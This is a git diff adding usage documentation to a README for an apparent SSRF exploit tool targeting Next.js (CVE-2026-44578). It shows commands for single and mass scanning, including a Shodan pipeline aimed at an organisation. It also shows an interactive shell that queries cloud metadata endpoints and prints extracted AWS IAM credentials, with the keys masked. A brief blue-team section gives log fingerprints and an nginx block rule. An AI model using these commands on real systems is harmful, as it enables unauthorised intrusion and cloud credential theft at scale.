@@ -77,3 +77,172 @@ The `//` in `http://` triggers `normalizeRepeatedSlashes` early-exit, setting `s
 > AWS IMDSv1 credentials exfiltrated via CVE-2026-44578 — interactive exploit shell
 
 ---
+
+## Install
+
+```bash
+git clone https://github.com/BS2010-AirborneTroops/NEXT-SSRF
+cd NEXT-SSRF
+python3 cvesiber2026.py -t https://target.com
+```
+
+> **Zero dependencies** — Python stdlib only. Python 3.10+ required.
+
+---
+
+## Usage
+
+### Single Target Scan
+
+```bash
+python3 cvesiber2026.py -t https://target.com
+```
+
+### Cloud-Specific Targeting
+
+```bash
+# AWS metadata only
+python3 cvesiber2026.py -t https://target.com --cloud aws
+
+# Custom internal target
+python3 cvesiber2026.py -t https://target.com \
+  --ssrf-host http://internal-api --path /admin
+
+# Deep scan (+ internal services)
+python3 cvesiber2026.py -t https://target.com --cloud aws --deep
+```
+
+### Mass Scan (Pipeline)
+
+```bash
+# subfinder + httpx + nextssrf
+subfinder -d target.com | httpx -silent | \
+  python3 cvesiber2026.py --pipe --threads 20 --cloud aws -o results.jsonl
+
+# File input
+python3 cvesiber2026.py -f targets.txt --threads 15 -o results.json
+
+# Force scan (even if version unknown)
+python3 cvesiber2026.py -t https://target.com --force
+```
+
+### Exit Codes
+
+| Code | Meaning                |
+|------|------------------------|
+| `0`  | Not vulnerable / clean |
+| `1`  | Vulnerable (no exploit)|
+| `2`  | SSRF confirmed         |
+
+---
+
+## Interactive Shell
+
+Advanced exploit shell with auto cloud detection and IAM credential extraction:
+
+```bash
+python3 cvesiber2026.py -t https://target.com
+```
+
+```
+╔══════════════════════════════════════════════════╗
+║  NextSSRF v2 — Interactive Exploit Shell         ║
+║  Target : ec2-x-x-x-x.compute.amazonaws.com     ║
+║  CVE    : CVE-2026-44578  |  Status: Connected   ║
+╚══════════════════════════════════════════════════╝
+
+nextssrf(ec2-x...)> cloud
+  [>] Detecting cloud provider...
+  ✓ AWS — matched: ['ami-id', 'instance-id', 'iam/', 'hostname']
+  → Run 'aws' for full credential extraction
+
+nextssrf(ec2-x...)> aws
+  [1/3] Instance Information
+  [200] Hostname    : ip-172-31-47-134.ec2.internal
+  [200] AZ          : us-east-1d
+  [200] Account ID  : {"AccountId": "370741706736"}
+
+  [2/3] IAM Role Discovery
+  ✓ IAM Role found: my-ec2-role
+
+  [3/3] Credential Extraction
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+  🎯 AWS CREDENTIALS EXFILTRATED!
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+  AccessKeyId : ASIAXXXXXXXXXXXXXXXXXX
+  SecretKey   : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+  Expiration  : 2026-05-14T22:32:22Z
+```
+
+### Shell Commands
+
+| Command        | Description                              |
+|----------------|------------------------------------------|
+| `cloud`        | Auto-detect cloud (AWS/Azure/GCP/DO/OCI) |
+| `aws`          | Full AWS IAM credential chain            |
+| `azure`        | Azure managed identity token             |
+| `scan`         | Cloud detect + auto exploit              |
+| `url <http://>`| Custom SSRF request                      |
+| `get <N>`      | AWS IMDS target by index                 |
+| `list`         | Show all IMDS endpoints                  |
+| `history`      | Request history                          |
+| `save`         | Export session to JSON                   |
+| `quit`         | Exit                                     |
+
+### Auto Mode
+
+```bash
+# Detect cloud + run full exploit chain automatically
+python3 cvesiber2026.py -t https://target.com --auto
+```
+
+---
+
+## Pipeline Examples
+
+```bash
+# Full recon → exploit pipeline
+subfinder -d target.com \
+  | httpx -silent -server \
+  | grep -i "next" \
+  | python3 cvesiber2026.py --pipe --cloud aws --deep -o findings.jsonl
+
+# Shodan mass scan → interactive on confirmed hosts
+python3 shodan_nextjs.py --key KEY --org "TargetCorp" \
+  | python3 cvesiber2026.py --pipe --cloud aws -o hits.jsonl
+
+# Check specific version range
+cat hosts.txt \
+  | python3 cvesiber2026.py --pipe --force --cloud aws \
+  | jq '.[] | select(.ssrf_hits | length > 0)'
+```
+
+---
+
+## Detection (Blue Team)
+
+Signs of exploitation in logs:
+
+```
+# Next.js process logs
+Failed to proxy http:/   ← single slash = normalization fingerprint
+
+# Access logs (absolute-form URI + Upgrade header)
+GET http://169.254.169.254/... HTTP/1.1
+Connection: Upgrade
+Upgrade: websocket
+```
+
+### Mitigation (if can't patch)
+
+```nginx
+# Nginx: reject absolute-form request URIs
+if ($request_uri ~* "^https?://") {
+    return 400;
+}
+```
+
+
+
+---
+
